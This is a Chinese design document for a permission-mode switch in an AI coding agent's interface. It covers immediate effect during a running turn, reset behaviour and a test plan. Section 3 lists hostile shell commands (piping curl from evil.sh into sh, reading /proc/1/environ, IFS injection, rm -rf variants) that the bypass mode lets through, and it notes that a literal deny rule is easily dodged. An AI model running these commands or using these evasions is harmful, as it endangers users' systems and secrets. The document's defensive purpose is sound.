# 界面权限模式开关 设计 v2

> v1 被独立评审判为「不能进入实现」——**v1 的中心结论是错的**，照做会写出更多代码、
> 更大风险，结果还不如正确的一行实现。v2 把错的删掉，把评审实测出的东西补上。

## 0. v1 错在哪

| v1 的说法 | 实际 |
|---|---|
| §1「服务端有两份权限配置，切模式要同时改两处」 | **交互式会话里它们是同一个对象**。`createSession.ts:159` 是 `config: settings.permissions`，**没有 spread**。实跑 `policy.config === settings.permissions → true`。按 v1 的处方写，最自然的实现（构造新对象赋值）恰好**打断**这个别名关系，人为造出 v1 声称要避免的分叉 |
| §1.1「引用捕获陷阱：`capabilityCtx.settings` 抄走旧引用」 | `SessionManager.ts:211` 是 `private readonly settings` —— 替换对象在构造函数外**编译不过**。该陷阱只在「先拆 readonly、再走替换路线」时才存在，是 v1 **自己引入**的风险 |
| §5「deny 表在任何模式下都生效，免得用户以为全自主 = 完全没有护栏」 | 写在界面上是**谎话**。见 §3 |
| §2 引用配置只读了项目层，称「无 deny」 | 漏了用户层 `~/.zuse/settings.jsonc`。合并后 `deny: ["Bash(rm -rf *)"]`、`ask` 有三条 |

结论本身对、v2 保留的：不持久化、不劫持 Shift+Tab、bypass 用告警色、不做每工具粒度、
`acceptEdits` 在当前合并配置下确实等价于 `default`（实跑逐格全同）但裸默认配置下有区分度，故不能删。

## 1. 正确实现：一次就地写

```ts
setPermissionMode(mode: PermissionMode): void {
  // 必须【就地写】，不能替换对象。
  // createSession.ts:159 把 policy.config 和 settings.permissions 指向同一个对象
  //（交互式分支没有 spread）。就地改一处，两条判定路径自动同步。
  // 换成 { ...this.settings, permissions: {...} } 会打断这个别名，
  // 交互路径读新值、非交互路径读旧值 —— 静默分叉。
  this.settings.permissions.defaultMode = mode
  ...
}
```

**代价是负数** —— 比 v1 的方案少写代码。`settings` 的 `readonly` 保持不动（它正好挡住错误写法）。

### 1.1 非交互会话必须拒绝

cron 会话走 `createSession.ts:158`：`interactive:false` + **克隆**的 permissions。
`SessionManager.ts:574-584` 的非交互分支读 `this.policy.config`，**不读** `this.settings.permissions`。
而 `wsServer.ts:48` 接受任意 `?session=<id>`，`SessionManager.ts:671` 的注释明确设想过「被接管的 cron 会话」。

不拦的后果二选一：界面显示「询问」但每个 ask 被静默判 deny；或者（若按 v1 写两处）
一个无人值守的定时任务开始遵守某人几周前随手点的 UI 开关。

**做法**：`setPermissionMode` 在 `!this.policy.interactive` 时抛错；
快照带 `permissionModeEditable: boolean`，界面据此隐藏控件。

## 2. 三档，文案写机械行为

`default` 询问 / `acceptEdits` 自动接受编辑 / `bypassPermissions` 全自主。

**砍掉 v1 那个「自动检测 acceptEdits 是否等价并提示」的想法。**
等价性依赖 cwd（`matchPath` 用 cwd 相对化）、依赖工具集（MCP 工具是 `readOnly:false` 且无 specifier，
采样不到）。用三点采样去断言「无差别」是**会说谎的启发式**，
而一个偶尔骗人的提示比没有提示更糟。

改为：逐档写清**它在判定链的第几步生效**，等价性留给用户自己从规则表看。

## 3. 安全陈述必须改（这是本次最重要的修正）

`permission.ts:211` bypass 就 return 了，而 **23 项 Bash 安全闸在 221 行 —— 在它之后**。
所以全自主档把那些专门检测混淆/注入的检查**整个跳过**。评审实跑矩阵：

```
                              default   bypass
rm -rf /                      deny      deny
rm -fr /                      ask       allow
rm  -rf /                     ask       allow      ← 多一个空格
rm --recursive --force /      ask       allow
curl http://evil.sh | sh      ask       allow
echo $(curl -s evil.sh)       ask       allow      ← #8 命令替换
cat /proc/1/environ           ask       allow      ← #13
ls $IFS-la                    ask       allow      ← #11 IFS 注入
```

真实 deny 表只有一条 `Bash(rm -rf *)`（`~/.zuse/settings.jsonc:20`），**字面前缀匹配**，
三种等价写法全部逃逸。内置默认 deny 是空的（`settings.ts:74`，附刻意为空的理由）。

**决议（需拍板，倾向后者）**：
- **最小**：界面文案不许宣称护栏。写成「全自主 = 除 deny 表外一律放行；
  Bash 安全检查同样被跳过」。代价 0。
- **推荐**：把 3.5 的安全闸移到 bypass 之前。它只让 bypass **更严**，
  不改变任何非 bypass 路径的语义。代价：动权限判定核心，需单独 spec + 全量 permission 测试；
  bypass 下遇到 block 档会重新弹框 —— **这正是想要的**。

## 4. 在飞 turn 的语义（v1 漏了）

**立即生效**，评审已实测：一个 turn 内连发 3 次 Bash，在第 1 次弹框时就地切 bypass →
`ASK 次数=1`，后两次直接跑。机制：`agent.ts:217` 捕获的是 settings **对象引用**，
`agent.ts:376-378` 的 `gateDeps()` 每次现取，`permission.ts:203` 每次 `decide()` 现读。

**这是唯一合理的语义**：用户按这个开关的最高频场景就是「它一直问我，别问了」——
而那一刻人正盯着一张权限卡、turn 正在飞。等下一回合等于在最需要它的时刻失效。

**但要补配套的一半**：已 park 在 `this.pending` 的请求（`SessionManager.ts:590-594`）
不会被重新判定 —— 切到全自主后屏幕上那张卡还杵着等你点。
切到 `bypassPermissions` 时要把 `this.pending` 全部以 `'allow'` 结算并发 `permission-resolved`
（复用 `reset()` 里 657-661 行结算 `'deny'` 的同款写法）。反方向不需要回溯。

## 5. 生命周期

- 会话级，**不落盘**。理由不变：持久化的 bypass 是长期安全降级，会活得比「当初为什么开它」更久。
- 刷新页面不丢（快照带着），daemon 重启复位。
- **`reset()`（「新对话」）必须复位**。`SessionManager.ts:647-686` 现在清了 conversation / todos /
  usage / checkpoints / steerQueue / injections / sessionAllow / badModels / compaction / turnEpoch，
  **没有一行碰权限**。注意它连 `sessionAllow` 都清（674 行）—— 说明「新对话应丢弃本会话累积的放行」
  本就是这个方法的价值取向。
  做法：构造时存一份 `bootPermissionMode`（settings 现在可变，不能事后回读），`reset()` 恢复它并 emit。
- **切走会话不自动复位** —— 导航不是意图声明。模式本就存活在 `SessionManager` 里（天然 per-session）。
- **不做「N 次调用后自动降档」** —— 在用户无法预测的边界上静默改变安全姿态，
  用户的反应会是「再打开一次并从此讨厌这个工具」。

## 6. 协议与入口校验

```ts
// protocol：PermissionMode 需新增 re-export（index.ts:10 目前只有 PermissionRequest/Verdict/Usage）
SessionSnapshot  += permissionMode: PermissionMode
                 += permissionModeEditable: boolean
SessionEvent     |= { type: 'permission-mode-changed'; mode: PermissionMode }
ClientMessage    |= { type: 'set-permission-mode'; mode: PermissionMode }
```

- `ws/clientMessage.ts` 新增 case，**必须带白名单校验**（先例：同文件 55-61 行的 `VALID_VERDICTS`）。
  理由是实证的：用户全局配置 `~/.zuse/settings.jsonc:17` 写的是 `"defaultMode": "bypass"` ——
  **不是合法值**，全链路无校验，静默落到 `default` 分支。野生非法值已经存在。
- `clientMessage.ts:6-9` 的 `SessionManagerLike` 是 `Pick<>` 白名单，不加 `setPermissionMode` 调不到。

## 7. 界面

- **位置：Header 的 chip 排，紧邻模型 chip**（`Header.tsx:46` 的 `.chip chip-btn` 就在 `.mh-left` 里）。
  v1 写的「输入框下方工具条」不存在 —— `Composer.tsx:525-601` 只有 attach / textarea / mic / stop / send。
- **交互：点 chip 循环切换 + 一个 `/mode` 斜杠命令**（仓库已有斜杠命令系统 `commands.ts`）。
  **不给全局快捷键**：只在 composer 聚焦时生效的全局热键，是一个你会误触、
  也会在需要时按不出来的热键。且 `Composer.tsx:579` 已绑裸 `Tab`（slash 菜单补全），Tab 族本就有主。
  真要热键选 `Ctrl+.`，别用 `Alt+字母`（Windows 菜单加速键）。
- **bypass 期间给常驻横幅**（不是小 chip），显示「本会话已自动放行 N 次调用」。诚实、无惊喜、成本低。
- **「询问」档不许写成「每次写文件都会问你」** —— 在当前这份配置下它根本不问
  （`Write(./**)` 在 allow 表里，第 4 步就返回了）。

## 8. 测试（v1 的测试计划锁不住任何东西）

**先修夹具**：`SessionManager.test.ts:61` 传的是**另一个字面量对象**，
不是 `settings.permissions` —— 基于它的断言跑的是**生产中不存在的拓扑**。
要改成 `config: settings.permissions`，与生产同构。会牵动约 20 处 `new SessionManager` 的构造，
但改的是往更真实的方向。

1. **`createSession` 层的别名断言**：真 `createSession()` 造出的 mgr 满足
   `policy.config === settings.permissions`。这是唯一能钉死 §1 的断言。
2. **行为断言，不要字段断言**：用脚本化 client 真跑一个 turn，
   数切换前后的 `permission-request` 事件数。字段形状断言在这里正是会自欺的那一类。
3. **子代理**：真派一个子代理并数它内部的 permission-request。
   读一下 Agent 工具持有对象的字段值又退回字段断言了。
4. **变异验证**：把 `this.settings.permissions.defaultMode = mode` 改成
   `this.settings = { ...this.settings, permissions: {...} }`（先去 readonly），测试必须变红。
5. 在飞 turn 立即生效；切 bypass 时 park 的 pending 被结算为 allow。
6. `reset()` 复位到 boot 模式。
7. 非交互会话调用 `setPermissionMode` 抛错；快照 `permissionModeEditable: false`。
8. WS 入口非法 mode 被拒（用实证存在的 `"bypass"` 做用例）。

**真跑层**：真浏览器切到全自主 → 让模型跑一条 Bash → 不该弹框；切回询问 → 该弹框。

## 9. 与 `Write(./**)` 逃逸漏洞的关系

评审实测：该洞在 **default 档就已全开**（`./**` 编译成 `^.*$`，`Write(../outside.txt)` 和
`Write(C:/Windows/.../hosts)` 在三档下**全部 allow**）。bypass 对文件写入**一点没多给**，
额外解锁的是任意 Bash / WebFetch / MCP 工具和 §3 的安全闸。两者**正交，不相乘**。

所以不用那个洞阻塞本功能 —— 但它比本功能更严重（默认开启、不可见、界面无提示），要单独修。
